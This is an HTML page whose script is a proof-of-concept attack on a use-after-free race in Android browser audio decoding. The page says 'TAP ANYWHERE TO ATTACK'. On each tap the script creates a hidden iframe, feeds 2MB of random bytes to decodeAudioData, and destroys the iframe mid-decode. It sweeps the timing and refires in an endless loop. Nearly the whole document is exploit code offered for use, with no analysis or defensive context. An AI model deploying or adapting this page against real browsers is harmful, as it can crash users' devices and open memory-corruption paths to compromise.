<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MediaCodec IFrame UAF</title>
</head>
<body style="background:#111; color:#0ff; font-family:monospace; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center;" onclick="fireMediaUAF()">
    
    <h2 id="status">TAP ANYWHERE TO ATTACK</h2>
    <div id="container"></div>

    <script>
        const statusEl = document.getElementById('status');
        const container = document.getElementById('container');
        
        let delay = 5;

        function fireMediaUAF() {
            statusEl.innerText = `[*] Firing at delay: ${delay}ms...`;

            // 1. Create an isolated IFrame context
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            container.appendChild(iframe);
            
            // 2. Initialize AudioContext INSIDE the IFrame
            let iwin = iframe.contentWindow;
            let AudioContext = iwin.AudioContext || iwin.webkitAudioContext;
            let ctx = new AudioContext();

            // 3. Create 2MB of garbage data to choke the hardware decoder
            let bufferSize = 1024 * 1024 * 2; 
            let buffer = new ArrayBuffer(bufferSize);
            let view = new Uint8Array(buffer);
            for (let i = 0; i < bufferSize; i++) {
                view[i] = Math.floor(Math.random() * 256); 
            }

            // 4. Send garbage to the native Android MediaCodec
            ctx.decodeAudioData(buffer, 
                function(success) {}, 
                function(error) {}
            );

            // 5. The Race Condition
            // Destroy the IFrame (and its C++ Audio wrapper) while the hardware is decoding
            setTimeout(() => {
                container.innerHTML = ''; // Nuke the IFrame from the DOM
                
                // Sweep the delay to catch the exact microsecond of the hardware callback
                delay += 3;
                if (delay > 50) delay = 5;
                
                // Automatically fire the next shot
                setTimeout(fireMediaUAF, 200);
                
            }, delay);
        }
    </script>
</body>
</html>
